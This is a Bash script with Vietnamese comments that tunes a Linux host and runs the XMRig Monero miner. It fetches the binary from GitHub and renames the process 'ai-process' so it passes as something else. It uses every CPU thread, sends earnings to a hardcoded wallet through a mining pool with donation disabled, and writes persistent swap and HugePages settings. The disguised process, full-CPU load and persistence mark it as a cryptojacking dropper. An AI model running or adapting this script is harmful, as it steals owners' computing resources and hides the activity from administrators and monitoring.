#!/bin/bash
# =========================================
# Script Chuẩn Bị Môi Trường + Chạy Miner RandomX
# =========================================

FAKE_NAME="ai-process"
POOL_URL="pool.supportxmr.com:443"
WALLET="892Z4mTTy3UhGwqGafXpj27Qttop42wVR6yU8gv43i9H2cfHP6V8guPAWAf71cm32wU9aESsqe274ZnhW8219GMiSzLhTKK"
LOG_FILE="./xmrig.log"

echo "=== Bắt đầu chuẩn bị môi trường ==="

# 1. Kiểm tra quyền root
if [ "$EUID" -ne 0 ]; then
  echo "❌ Vui lòng chạy script với quyền root (sudo)."
  exit 1
fi

# 2. Nạp module MSR
echo "[1/6] Nạp module MSR..."
modprobe msr && echo "✅ MSR module loaded." || echo "⚠️ Không thể nạp MSR."

# 3. Bật HugePages
echo "[2/6] Cấu hình HugePages..."
sysctl -w vm.nr_hugepages=128
grep -q "vm.nr_hugepages" /etc/sysctl.conf || echo "vm.nr_hugepages = 128" >> /etc/sysctl.conf

# 4. Tạo swap 2GB nếu chưa có
echo "[3/6] Kiểm tra swap..."
if free | awk '/Swap:/ {exit !$2}'; then
    echo "✅ Swap đã tồn tại."
else
    echo "➕ Tạo swap 2GB..."
    fallocate -l 2G /swapfile
    chmod 600 /swapfile
    mkswap /swapfile
    swapon /swapfile
    echo "/swapfile swap swap defaults 0 0" >> /etc/fstab
fi

# 5. Tối ưu CPU governor
echo "[4/6] Chuyển CPU governor sang performance..."
for CPUFREQ in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
    echo performance > "$CPUFREQ"
done

# 6. Kiểm tra lại trạng thái
echo "[5/6] Trạng thái:"
echo "MSR module: $(lsmod | grep msr || echo 'Chưa nạp')"
grep Huge /proc/meminfo | grep -E 'HugePages_Total|Hugepagesize'
free -h | grep Swap
echo "Governor CPU: $(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor)"

echo "=== Chuẩn bị môi trường xong ==="

# 7. Cài và chạy xmrig
echo "[6/6] Kiểm tra xmrig..."
if [ ! -f "./xmrig" ]; then
    echo "[*] Đang tải XMrig..." | tee -a $LOG_FILE
    curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
    tar -xf xmrig.tar.gz
    mv xmrig-*/xmrig . && chmod +x xmrig
    rm -rf xmrig-*
fi

# Đổi tên giả và phân quyền
cp xmrig $FAKE_NAME
chmod +x $FAKE_NAME

# Sử dụng toàn bộ luồng CPU
CORES_TO_USE=$(nproc)

echo "[*] Đang chạy tiến trình '$FAKE_NAME' sử dụng $CORES_TO_USE luồng CPU..." | tee -a $LOG_FILE

# Chạy miner với full CPU, tắt donate, log nhẹ
./$FAKE_NAME -o $POOL_URL -u $WALLET -k --tls --donate-level 0 \
--cpu-max-threads-hint=$CORES_TO_USE --randomx-1gb-pages --randomx-no-numa \
--threads=$CORES_TO_USE --log-file=$LOG_FILE &

# Giữ script sống
while true; do
    sleep 60
done
